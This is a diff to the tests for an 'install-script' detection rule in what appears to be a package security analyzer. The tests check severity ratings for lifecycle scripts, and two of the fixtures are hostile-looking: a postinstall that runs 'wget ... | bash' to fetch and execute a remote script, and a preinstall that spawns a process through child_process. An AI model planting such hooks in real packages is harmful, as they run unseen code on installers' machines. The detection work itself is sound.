@@ -62,7 +62,7 @@ describe("install-script rule", () => {
     assert.ok(finding);
   });
 
-  it("does not flag curl to a domain (not IP)", () => {
+  it("flags a lifecycle download from a domain as high severity", () => {
     const pkg = {
       name: "pkg",
       version: "1.0.0",
@@ -74,7 +74,56 @@ describe("install-script rule", () => {
     const finding = report.findings.find(
       (f) => f.ruleId === "install-script",
     );
-    assert.strictEqual(finding, undefined);
+    assert.ok(finding);
+    assert.strictEqual(finding.severity, Severity.High);
+  });
+
+  it("flags a lifecycle download piped to a shell as critical", () => {
+    const pkg = {
+      name: "pkg",
+      version: "1.0.0",
+      scripts: {
+        postinstall: "wget -qO- https://example.com/setup | bash",
+      },
+    };
+    const report = analyzer.analyze("", pkg);
+    const finding = report.findings.find(
+      (f) => f.ruleId === "install-script",
+    );
+    assert.ok(finding);
+    assert.strictEqual(finding.severity, Severity.Critical);
+  });
+
+  it("flags process execution in a lifecycle script as high severity", () => {
+    const pkg = {
+      name: "pkg",
+      version: "1.0.0",
+      scripts: {
+        preinstall: "node -e \"require('child_process').execSync('whoami')\"",
+      },
+    };
+    const report = analyzer.analyze("", pkg);
+    const finding = report.findings.find(
+      (f) => f.ruleId === "install-script",
+    );
+    assert.ok(finding);
+    assert.strictEqual(finding.severity, Severity.High);
+  });
+
+  it("reports a generic lifecycle script as medium severity", () => {
+    const pkg = {
+      name: "native-addon",
+      version: "1.0.0",
+      scripts: {
+        install: "node-gyp rebuild",
+      },
+    };
+    const report = analyzer.analyze("", pkg);
+    const finding = report.findings.find(
+      (f) => f.ruleId === "install-script",
+    );
+    assert.ok(finding);
+    assert.strictEqual(finding.severity, Severity.Medium);
   });
 
   it("does not flag non-lifecycle scripts", () => {
